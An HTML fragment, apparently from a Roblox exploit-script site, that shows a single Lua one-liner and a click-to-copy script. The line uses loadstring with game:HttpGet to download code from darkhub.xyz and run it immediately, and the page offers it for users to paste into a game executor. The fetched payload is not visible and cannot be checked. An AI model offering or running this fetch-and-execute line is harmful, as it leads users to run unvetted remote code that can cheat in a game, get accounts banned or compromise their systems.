    <div style="display: flex;justify-content: center;">
        <pre id="code"><font size="4">loadstring(game:HttpGet(("https://darkhub.xyz/script"), true))()</font></pre>

    <div style="display: flex;justify-content: center;">Click on the script to copy to clipboard
    </div>
    <script>
      const span = document.querySelector("font");
      span.onclick = function() {
        document.execCommand("copy");
      }
      span.addEventListener("copy", function(event) {
        event.preventDefault();
        if (event.clipboardData) {
          event.clipboardData.setData("text/plain", span.textContent);
          console.log(event.clipboardData.getData("text"));
          alert("Script copied to clipboard");
        }
      });
    </script>
